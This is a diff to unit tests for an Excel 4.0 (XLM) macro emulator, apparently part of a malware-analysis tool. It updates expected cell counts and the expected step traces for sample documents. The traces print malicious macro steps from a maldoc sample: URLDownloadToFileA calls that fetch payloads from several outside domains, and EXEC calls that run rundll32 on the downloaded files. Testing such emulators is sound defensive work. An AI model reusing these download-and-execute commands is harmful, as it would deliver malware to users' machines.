@@ -53,7 +53,7 @@ class TestEmulator(TestBase):
             ('rpn', XLM_MACRO_RPN_BIFF8, 'mP9mScF1m5', 10, 20, XlmStatus.End),
             ('names', XLM_MACRO_NAMES_BIFF8, 'Acf444', 9591, 1, XlmStatus.PartialEvaluation),
             ('assign', XLM_MACRO_ASSIGN_BIFF8, 'sod', 25282, 148, XlmStatus.End),
-            ('text', XLM_MACRO_TEXT_XLSM, 'Doc1', 121, 52, XlmStatus.PartialEvaluation),
+            ('text', XLM_MACRO_TEXT_XLSM, 'Doc1', 114, 62, XlmStatus.End),
             ('formula', XLM_MACRO_FORMULA_XLSM, 'PCWV', 34, 7, XlmStatus.FullEvaluation),
             ('maldoc', _MALDOC, 'Tiposa1', 30, 7, XlmStatus.FullEvaluation),
         ]:
@@ -85,11 +85,11 @@ class TestEmulator(TestBase):
     def test_every_output_level_shows_the_steps_its_severity_promises(self):
         for name, key, counts in [
             ('rpn', XLM_MACRO_RPN_BIFF8, [20, 19, 8]),
-            ('names', XLM_MACRO_NAMES_BIFF8, [1, 1, 0]),
+            ('names', XLM_MACRO_NAMES_BIFF8, [1, 1, 1]),
             ('assign', XLM_MACRO_ASSIGN_BIFF8, [141, 86, 8]),
-            ('text', XLM_MACRO_TEXT_XLSM, [22, 9, 5]),
-            ('formula', XLM_MACRO_FORMULA_XLSM, [11, 10, 8]),
-            ('maldoc', _MALDOC, [27, 6, 1]),
+            ('text', XLM_MACRO_TEXT_XLSM, [16, 16, 10]),
+            ('formula', XLM_MACRO_FORMULA_XLSM, [10, 10, 9]),
+            ('maldoc', _MALDOC, [27, 6, 4]),
         ]:
             with self.subTest(sample=name):
                 steps = self._steps(self.download_sample(key))
@@ -107,10 +107,17 @@ class TestEmulator(TestBase):
                 ('Doc1', 110, 52),
                 ('Doc1', 118, 52),
                 ('Doc1', 120, 52),
+                ('Doc1', 121, 52),
                 ('Doc1', 93, 56),
                 ('Doc1', 95, 56),
                 ('Doc1', 97, 56),
                 ('Doc1', 99, 56),
+                ('Doc1', 104, 56),
+                ('Doc1', 109, 58),
+                ('Doc1', 110, 58),
+                ('Doc1', 111, 58),
+                ('Doc1', 112, 58),
+                ('Doc1', 113, 58),
                 ('Doc1', 114, 62),
             ],
         )
@@ -121,6 +128,7 @@ class TestEmulator(TestBase):
                 'SET.VALUE(BD109,"URLDownloadToFile")',
                 'SET.VALUE(BD119,"JJCCBB")',
                 'SET.VALUE(Doc1!BD121,"rundll3")',
+                'Doc1!BD91()',
                 'CALL("URLMon","URLDownloadToFileA","JJCCBB",0,'
                 '"https://maharaniworld.com/ds/3103.gif","..\\iekdhfe.dsk1",0,0)',
                 'CALL("URLMon","URLDownloadToFileA","JJCCBB",0,'
@@ -129,6 +137,12 @@ class TestEmulator(TestBase):
                 '"https://sgb.ac.ke/ds/3103.gif","..\\iekdhfe.dsk3",0,0)',
                 'CALL("URLMon","URLDownloadToFileA","JJCCBB",0,'
                 '"https://hashmati.com/ds/3103.gif","..\\iekdhfe.dsk4",0,0)',
+                'Doc1!BF109()',
+                '=EXEC("rundll32 ..\\iekdhfe.dsk,DllRegisterServer")',
+                '=EXEC("rundll32 ..\\iekdhfe.dsk1,DllRegisterServer")',
+                '=EXEC("rundll32 ..\\iekdhfe.dsk2,DllRegisterServer")',
+                '=EXEC("rundll32 ..\\iekdhfe.dsk3,DllRegisterServer")',
+                '=EXEC("rundll32 ..\\iekdhfe.dsk4,DllRegisterServer")=Doc1!BJ114()',
                 'HALT()',
             ],
         )
